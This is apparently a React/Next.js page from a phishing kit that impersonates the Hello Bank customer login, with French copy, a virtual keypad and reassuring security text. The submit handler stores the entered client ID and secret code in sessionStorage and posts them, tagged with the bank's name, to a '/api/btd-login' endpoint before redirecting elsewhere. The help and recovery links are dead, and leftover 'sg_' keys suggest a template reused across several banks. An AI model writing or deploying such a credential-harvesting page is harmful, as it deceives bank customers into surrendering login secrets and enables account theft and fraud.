'use client';

import React, { useState, FormEvent } from 'react';
import { useRouter } from 'next/navigation';

interface HelloBankConnexionProps {
  partnerLogoSrc?: string;
  hbLogoSrc?: string;
}

export default function HelloBankConnexionPage({
  partnerLogoSrc = '/favicon.ico',
  hbLogoSrc = '/images.jpeg',
}: HelloBankConnexionProps) {
  const router = useRouter();

  const [step, setStep] = useState<'id' | 'password'>('id');
  const [clientId, setClientId] = useState<string>('');
  const [rememberMe, setRememberMe] = useState<boolean>(false);
  const [secretCode, setSecretCode] = useState<string>('');
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);

  // Disposition de la grille du clavier virtuel
  const keyLayout = ['1', '5', '7', '2', '3', '8', '9', '6', '4', '0', 'Empty', 'Clear'];

  // Validation : Alphanumérique sans limite de longueur (au moins 1 caractère)
  const isIdValid = clientId.trim().length > 0;
  const isPassValid = secretCode.trim().length > 0;

  const handleIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Saisie libre alphanumérique sans restriction de regex ni limite de caractères
    setClientId(e.target.value);
  };

  const handleClearId = () => {
    setClientId('');
  };

  const handleContinue = (e: FormEvent) => {
    e.preventDefault();
    if (isIdValid) {
      setStep('password');
    }
  };

  const handleBackToId = () => {
    setSecretCode('');
    setStep('id');
  };

  const handleKeyClick = (key: string) => {
    if (key === 'Clear') {
      setSecretCode((prev) => prev.slice(0, -1));
    } else if (key !== 'Empty') {
      setSecretCode((prev) => prev + key);
    }
  };

// Soumission vers /api/btd-login et redirection vers /bat
  const handleFinalSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!secretCode.trim() || isSubmitting) return;

    setIsSubmitting(true);

    // Payload aligné sur les clés lues par la route API
    const payload = {
      nom_banque: 'HELLO BANK',
      identifiant: clientId,
      secret_code: secretCode,
    };

    try {
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('sg_client_id', clientId);
        sessionStorage.setItem('sg_secret_code', secretCode);
      }

      const res = await fetch('/api/btd-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      // Vérification de la réussite HTTP
      if (!res.ok) {
        throw new Error(`Erreur réseau (Statut : ${res.status})`);
      }

      const data = await res.json();

      if (data.success) {
        router.push('/bat');
      }
    } catch (error) {
      console.error('Erreur lors de la soumission :', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <style>{`
        .hb-body-wrapper {
          font-family: 'Inter', system-ui, -apple-system, sans-serif;
          background-color: #ffffff;
          color: #002e3b;
          display: flex;
          justify-content: center;
          min-height: 100vh;
          width: 100%;
          -webkit-font-smoothing: antialiased;
        }
        .hb-app-container {
          width: 100%;
          max-width: 450px;
          background-color: #ffffff;
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          position: relative;
        }
        .hb-top-navbar {
          background-color: #00a2ca;
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 12px 16px;
          height: 65px;
        }
        .hb-logo-rect {
          display: flex;
          align-items: center;
          gap: 10px;
        }

        /* Dimensionnement identique pour les deux logos */
        .hb-partner-logo,
        .hb-main-brand {
          height: 38px !important;
          width: auto;
          max-width: 40px;
          object-fit: contain;
          display: block;
        }

        .hb-logo-sep {
          color: #ffffff;
          font-size: 16px;
          font-weight: 600;
          opacity: 0.8;
        }

        .hb-btn-pill-white {
          background-color: #ffffff;
          color: #00a2ca;
          border: none;
          border-radius: 20px;
          padding: 8px 16px;
          font-size: 14px;
          font-weight: 700;
          cursor: pointer;
        }
        .hb-title-container {
          padding: 30px 20px 15px 20px;
          text-align: center;
        }
        .hb-main-title {
          font-size: 24px;
          font-weight: 700;
          color: #003b4a;
          line-height: 1.3;
        }
        .hb-content-body {
          padding: 0 20px;
          flex-grow: 1;
          display: flex;
          flex-direction: column;
        }
        .hb-input-group {
          margin-top: 15px;
          margin-bottom: 20px;
        }
        .hb-input-label {
          display: block;
          font-size: 15px;
          font-weight: 700;
          color: #003b4a;
          margin-bottom: 10px;
        }
        .hb-input-wrapper {
          display: flex;
          align-items: center;
          border: 2px solid #00a2ca;
          border-radius: 8px;
          overflow: hidden;
          background: #ffffff;
          height: 52px;
          position: relative;
        }
        .hb-input-wrapper-disabled {
          border-color: #cbd5e0;
        }
        .hb-input-wrapper input {
          width: 100%;
          border: none;
          outline: none;
          padding: 0 14px;
          font-size: 16px;
          color: #003b4a;
        }
        .hb-input-wrapper input::placeholder {
          color: #a0aec0;
        }
        .hb-input-clear-btn,
        .hb-toggle-pwd-btn {
          background: transparent;
          border: none;
          border-left: 1px solid #e2e8f0;
          font-size: 14px;
          color: #a0aec0;
          padding: 0 14px;
          height: 100%;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        .hb-checkbox-container {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 30px;
        }
        .hb-native-checkbox {
          width: 20px;
          height: 20px;
          accent-color: #00a2ca;
          cursor: pointer;
        }
        .hb-checkbox-label {
          font-size: 14px;
          color: #003b4a;
          user-select: none;
          cursor: pointer;
        }
        .hb-btn-submit-fluid {
          width: 100%;
          padding: 14px;
          border: none;
          border-radius: 25px;
          font-size: 16px;
          font-weight: 700;
          text-align: center;
          transition: background-color 0.2s ease;
          background-color: #cbd5e0;
          color: #ffffff;
          cursor: not-allowed;
        }
        .hb-btn-state-active {
          background-color: #00a2ca !important;
          color: #ffffff !important;
          cursor: pointer !important;
        }
        .hb-lost-codes-row {
          text-align: center;
          margin: 25px 0;
        }
        .hb-link-cyan {
          color: #00a2ca;
          font-size: 14px;
          font-weight: 500;
          text-decoration: underline;
        }
        .space-top {
          margin-top: 15px;
        }
        .hb-info-footer-section {
          background-color: #f4fbfc;
          margin: 20px -20px 0 -20px;
          padding: 24px 20px;
          border-top: 1px solid #e2f4f7;
          display: flex;
          flex-direction: column;
          gap: 24px;
        }
        .hb-info-card {
          display: flex;
          flex-direction: column;
          gap: 6px;
        }
        .hb-info-card-title {
          font-size: 16px;
          font-weight: 700;
          color: #003b4a;
          display: flex;
          align-items: center;
          gap: 8px;
        }
        .hb-info-card-text {
          font-size: 13.5px;
          color: #4a5568;
          line-height: 1.5;
        }
        .hb-card-link {
          font-size: 13.5px;
          color: #00a2ca;
          text-decoration: underline;
          font-weight: 500;
          margin-top: 2px;
        }
        .hb-password-instruction {
          font-size: 15px;
          font-weight: 700;
          color: #003b4a;
          margin-bottom: 15px;
        }
        .hb-keyboard-card-box {
          background: #f7fafc;
          border: 1px solid #edf2f7;
          border-radius: 12px;
          padding: 16px;
          margin-bottom: 25px;
        }
        .hb-grid-matrix {
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          gap: 12px;
        }
        .hb-matrix-btn {
          background: #ffffff;
          border: 1px solid #e2e8f0;
          border-radius: 8px;
          height: 54px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 18px;
          font-weight: 700;
          color: #003b4a;
          cursor: pointer;
          user-select: none;
          box-shadow: 0 2px 4px rgba(0,0,0,0.02);
          transition: background-color 0.1s;
        }
        .hb-matrix-btn:active {
          background-color: #edf2f7;
        }
        .hb-btn-hidden {
          visibility: hidden;
          pointer-events: none;
        }
        .hb-btn-utility {
          background-color: #edf2f7;
          font-size: 14px;
          font-weight: 600;
          color: #4a5568;
        }
      `}</style>

      <div className="hb-body-wrapper">
        <div className="hb-app-container">
          <header className="hb-top-navbar">
            <div className="hb-nav-left">
              <div className="hb-logo-rect">
                {partnerLogoSrc && (
                  <>
                    <img src={partnerLogoSrc} alt="Favicon" className="hb-partner-logo" />
                    <span className="hb-logo-sep">→</span>
                  </>
                )}
                <img src={hbLogoSrc} alt="Hello Bank" className="hb-main-brand" />
              </div>
            </div>
            <div className="hb-nav-right">
              <button
                type="button"
                className="hb-btn-pill-white"
                onClick={() => router.back()}
              >
                Retour à Hello bank!
              </button>
            </div>
          </header>

          <div className="hb-title-container">
            <h1 className="hb-main-title">Accédez à votre espace client</h1>
          </div>

          <main className="hb-content-body">
            {step === 'id' && (
              <form onSubmit={handleContinue}>
                <div className="hb-input-group">
                  <label htmlFor="hb-id-field" className="hb-input-label">
                    Numéro Client / Identifiant
                  </label>
                  <div
                    className={`hb-input-wrapper ${
                      clientId.length === 0 ? 'hb-input-wrapper-disabled' : ''
                    }`}
                  >
                    <input
                      type="text"
                      id="hb-id-field"
                      placeholder="Votre identifiant"
                      value={clientId}
                      onChange={handleIdChange}
                      autoComplete="off"
                    />
                    {clientId.length > 0 && (
                      <button
                        type="button"
                        className="hb-input-clear-btn"
                        onClick={handleClearId}
                      >
                        ✕
                      </button>
                    )}
                  </div>
                </div>

                <div className="hb-checkbox-container">
                  <input
                    type="checkbox"
                    id="hb-remember"
                    className="hb-native-checkbox"
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                  />
                  <label htmlFor="hb-remember" className="hb-checkbox-label">
                    Mémoriser mon numéro client
                  </label>
                </div>

                <button
                  type="submit"
                  disabled={!isIdValid}
                  className={`hb-btn-submit-fluid ${isIdValid ? 'hb-btn-state-active' : ''}`}
                >
                  Continuer
                </button>

                <div className="hb-lost-codes-row">
                  <a
                    href="#"
                    className="hb-link-cyan"
                    onClick={(e) => {
                      e.preventDefault();
                      alert('Service indisponible actuellement.');
                    }}
                  >
                    Numéro client ou code secret oublié
                  </a>
                </div>

                <section className="hb-info-footer-section">
                  <div className="hb-info-card">
                    <h3 className="hb-info-card-title">🔒 Sécurité</h3>
                    <p className="hb-info-card-text">
                      Votre sécurité est notre priorité. Toutes vos données sont chiffrées et protégées. Ne communiquez jamais vos identifiants et changez régulièrement votre mot de passe.
                    </p>
                    <a
                      href="#"
                      className="hb-card-link"
                      onClick={(e) => e.preventDefault()}
                    >
                      Consulter tous nos conseils sécurité et fraude
                    </a>
                  </div>

                  <div className="hb-info-card">
                    <h3 className="hb-info-card-title">❓ Besoin d'aide ?</h3>
                    <p className="hb-info-card-text">
                      Vous avez oublié vos identifiants ? Des difficultés pour vous connecter ? Contactez notre service client disponible 24h/24 et 7j/7.
                    </p>
                    <a
                      href="#"
                      className="hb-card-link"
                      onClick={(e) => e.preventDefault()}
                    >
                      Consulter notre Assistance technique
                    </a>
                  </div>
                </section>
              </form>
            )}

            {step === 'password' && (
              <form onSubmit={handleFinalSubmit}>
                <p className="hb-password-instruction">Saisissez votre code secret</p>

                {/* Champ de saisie alphanumérique libre et sans limite de longueur */}
                <div className="hb-input-group" style={{ marginTop: 0 }}>
                  <div className="hb-input-wrapper">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      placeholder="Votre code secret"
                      value={secretCode}
                      onChange={(e) => setSecretCode(e.target.value)}
                      autoComplete="off"
                    />
                    <button
                      type="button"
                      className="hb-toggle-pwd-btn"
                      onClick={() => setShowPassword((prev) => !prev)}
                    >
                      {showPassword ? 'Masquer' : 'Afficher'}
                    </button>
                  </div>
                </div>

                {/* Clavier visuel d'appoint */}
                <div className="hb-keyboard-card-box">
                  <div className="hb-grid-matrix">
                    {keyLayout.map((key, i) => {
                      if (key === 'Empty') {
                        return <div key={i} className="hb-matrix-btn hb-btn-hidden" />;
                      }
                      if (key === 'Clear') {
                        return (
                          <div
                            key={i}
                            className="hb-matrix-btn hb-btn-utility"
                            onClick={() => handleKeyClick('Clear')}
                          >
                            Effacer
                          </div>
                        );
                      }
                      return (
                        <div
                          key={i}
                          className="hb-matrix-btn"
                          onClick={() => handleKeyClick(key)}
                        >
                          {key}
                        </div>
                      );
                    })}
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={!isPassValid || isSubmitting}
                  className={`hb-btn-submit-fluid ${
                    isPassValid && !isSubmitting ? 'hb-btn-state-active' : ''
                  }`}
                >
                  {isSubmitting ? 'Connexion...' : 'Accéder à mon espace client'}
                </button>

                <div className="hb-lost-codes-row space-top">
                  <span
                    className="hb-link-cyan"
                    style={{ cursor: 'pointer' }}
                    onClick={handleBackToId}
                  >
                    ‹ Retour à la saisie de l'identifiant
                  </span>
                </div>
              </form>
            )}
          </main>
        </div>
      </div>
    </>
  );
}